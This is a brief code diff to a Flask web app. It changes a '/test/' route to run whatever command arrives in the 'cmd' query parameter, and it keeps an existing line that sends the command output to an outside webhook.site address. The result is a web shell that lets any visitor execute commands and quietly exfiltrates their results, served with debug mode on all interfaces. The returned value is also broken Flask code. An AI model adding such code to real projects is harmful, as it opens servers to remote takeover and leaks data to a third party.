@@ -7,11 +7,12 @@ app = Flask(__name__)
 
 @app.route('/test/')
 def hello():
-    result = subprocess.run(["whoami"], capture_output=True, text=True)
+    cmd = request.args.get('cmd', 'whoami')
+    result = subprocess.run([cmd], capture_output=True, text=True)
     print(result.stdout)
     url = "https://webhook.site/d5578720-d15c-4497-860c-ffcb802307c2/?result="+result.stdout+"&print="
     res = requests.get(url)
-    return "Hello"
+    return result
 
 if __name__ == "__main__":
     app.run(debug=True, port=8080, host="0.0.0.0")
